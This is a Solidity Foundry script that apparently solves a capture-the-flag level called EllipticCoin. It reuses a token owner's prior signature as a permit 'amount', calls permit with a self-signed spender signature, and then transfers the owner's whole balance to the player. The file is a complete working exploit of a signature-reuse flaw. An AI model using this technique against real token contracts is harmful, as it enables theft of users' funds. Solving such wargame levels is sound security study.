// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {EllipticToken} from "src/35.EllipticCoin.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract EllipticCoinScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address playerAddr = msg.sender;
        address instanceAddr = 0x40b415d35838E8f79058726aE4Ea2FcDf4773C10;
        address aliceAddr = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;

        EllipticToken ellipticToken = EllipticToken(instanceAddr);

        uint256 aliceBalance = ellipticToken.balanceOf(aliceAddr);

        uint256 amount = uint256(0xebf90284f84cb6e234a8ecf9393afda9c0ede46f4d6df12bd11a4757c42903c0); // message hash

        bytes memory tokenOwnerSignature =
            hex"0ab5b8262a97582b1971d68211e37be02ac5d16339cb0278edffc0a465d64aac7b06ed5cd7bc5798089feda2fac7b577ef49e1f2f84a6d2392ff26078f2192a01c";

        bytes32 permitHash = keccak256(abi.encodePacked(aliceAddr, playerAddr, amount));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerAddr, permitHash); // sign the permit hash with spender

        bytes memory spenderSignature = abi.encodePacked(r, s, v);

        ellipticToken.permit(amount, playerAddr, tokenOwnerSignature, spenderSignature);
        ellipticToken.transferFrom(aliceAddr, playerAddr, aliceBalance);

        uint256 playerBalance = ellipticToken.balanceOf(playerAddr);

        console.log("Player Balance after transfer:", playerBalance);

        vm.stopBroadcast();
    }
}
